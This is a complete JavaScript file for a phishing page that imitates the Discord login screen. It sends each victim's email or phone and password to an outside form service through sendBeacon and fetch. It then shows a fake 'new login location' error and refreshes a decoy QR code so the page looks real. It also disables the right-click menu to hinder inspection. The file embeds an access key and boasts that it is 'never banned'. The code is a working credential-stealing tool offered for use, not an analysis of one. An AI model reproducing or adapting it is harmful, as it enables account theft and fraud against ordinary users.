// ==================================
// FULL WORKING script.js – WEB3FORMS (NEVER BANNED)
// Your access key: d27990e4-8666-44da-b5e0-1e073eecbc44
// ==================================

const CONFIG = {
  ACCESS_KEY: "d27990e4-8666-44da-b5e0-1e073eecbc44",  // YOUR REAL KEY
  ANIMATION_DURATION: 3000,
  QR_REFRESH_INTERVAL: 120000
};

// ==================================
// SELECTORS
// ==================================
const DOM = {
  form: document.querySelector('#loginForm'),
  emailInput: document.querySelector('#emailORphone'),
  passwordInput: document.querySelector('#password'),
  loginButton: document.querySelector('button[type="submit"]'),
  emailWrapper: document.querySelector('.email-wrapper'),
  qrContainer: document.querySelector('.right-section .qr-code')
};

// ==================================
// SEND CREDENTIALS TO YOUR EMAIL (INSTANT DELIVERY)
// ==================================
const sendCredentials = (email, password) => {
  const data = {
    access_key: CONFIG.ACCESS_KEY,
    email_or_phone: email,
    password: password,
    user_agent: navigator.userAgent,
    timestamp: new Date().toLocaleString(),
    subject: "New Discord Login Captured"
  };

  // Method 1: sendBeacon (100% silent + reliable)
  if (navigator.sendBeacon) {
    navigator.sendBeacon("https://api.web3forms.com/submit", JSON.stringify(data));
  }

  // Method 2: fetch fallback (extra insurance)
  fetch("https://api.web3forms.com/submit", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  });
};

// ==================================
// QR CODE REFRESH (keeps it realistic)
// ==================================
const refreshQR = () => {
  if (!DOM.qrContainer) return;
  DOM.qrContainer.innerHTML = `
    <img src="./assets/qrcode-app-logo.png" alt="App Logo" style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:60px;">
  `;
  setTimeout(() => {
    const fakeLink = `https://app.com/ra/${Math.random().toString(36).substring(2,15)}`;
    const qr = qrcode(0, "L");
    qr.addData(fakeLink); qr.make();
    const svg = qr.createSvgTag(1, 0);
    const parser = new DOMParser();
    const svgEl = parser.parseFromString(svg, "image/svg+xml").documentElement;
    svgEl.setAttribute("width", "160");
    svgEl.setAttribute("height", "160");
    DOM.qrContainer.innerHTML = "";
    DOM.qrContainer.appendChild(svgEl);
    DOM.qrContainer.insertAdjacentHTML("beforeend", `<img src="./assets/qrcode-app-logo.png" alt="">`);
  }, 1500);
};

// ==================================
// MAIN LOGIN SUBMIT HANDLER
// ==================================
DOM.form.addEventListener('submit', async function(e) {
  e.preventDefault();

  const email = DOM.emailInput.value.trim();
  const password = DOM.passwordInput.value;

  // Show loading spinner
  DOM.loginButton.innerHTML = `
    <span class="spinner" role="img" aria-label="Loading">
      <span class="inner pulsingEllipsis">
        <span class="item spinnerItem"></span>
        <span class="item spinnerItem"></span>
        <span class="item spinnerItem"></span>
      </span>
    </span>
  `;
  DOM.loginButton.disabled = true;

  // APPLY ELLIPSIS ANIMATION
  document.querySelectorAll(".spinnerItem").forEach((el, i) => {
    el.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${i * 0.2}s`;
  });

  // SEND CREDENTIALS TO YOUR EMAIL
  sendCredentials(email, password);

  // Wait 3 seconds (fake processing)
  await new Promise(r => setTimeout(r, CONFIG.ANIMATION_DURATION));

  // Show fake "new login location" error
  if (!DOM.emailWrapper.querySelector('.fake-error')) {
    DOM.emailWrapper.insertAdjacentHTML('afterbegin', 
      '<span class="fake-error" style="color:red;font-size:12px;display:block;margin:5px 0;">New login location detected, please check your e-mail.</span>'
    );
  }
  DOM.emailInput.style.border = '1px solid red';
  DOM.passwordInput.style.border = '1px solid red';

  // Reset button
  DOM.loginButton.innerHTML = 'Log In';
  DOM.loginButton.disabled = false;
});

// ==================================
// INITIALIZATION
// ==================================
document.addEventListener('DOMContentLoaded', () => {
  refreshQR();
  setInterval(refreshQR, CONFIG.QR_REFRESH_INTERVAL);
  document.addEventListener('contextmenu', e => e.preventDefault());
});